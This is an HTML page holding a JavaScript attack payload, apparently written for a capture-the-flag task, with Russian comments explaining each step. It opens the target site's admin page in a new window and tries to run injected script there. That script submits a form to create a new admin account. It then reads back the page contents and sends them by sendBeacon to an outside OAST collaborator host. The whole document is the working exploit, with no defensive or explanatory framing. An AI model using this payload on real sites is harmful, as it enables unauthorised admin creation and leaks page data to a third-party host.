<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Открываем новое окно с целевым сайтом
const win = window.open(TARGET + '/admin', '_blank');

setTimeout(() => {
    try {
        // В новом окне выполняем скрипт
        const script = `
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/create_admin';
            form.innerHTML = '<input name="new_admin_login" value="FROM_WINDOW_OPEN">';
            document.body.appendChild(form);
            form.submit();
            
            setTimeout(() => {
                // Отправляем результат через postMessage
                window.opener.postMessage({
                    type: 'result',
                    data: document.body.innerHTML.substring(0, 2000)
                }, '*');
            }, 2000);
        `;
        
        win.eval(script);
    } catch(e) {
        navigator.sendBeacon(COLLAB + '/error', 'window_open_error: ' + e.message);
    }
}, 2000);

// Получаем результат
window.addEventListener('message', function(event) {
    if (event.data && event.data.type === 'result') {
        navigator.sendBeacon(
            COLLAB + '/window_result',
            event.data.data
        );
    }
});
</script>
</body>
</html>
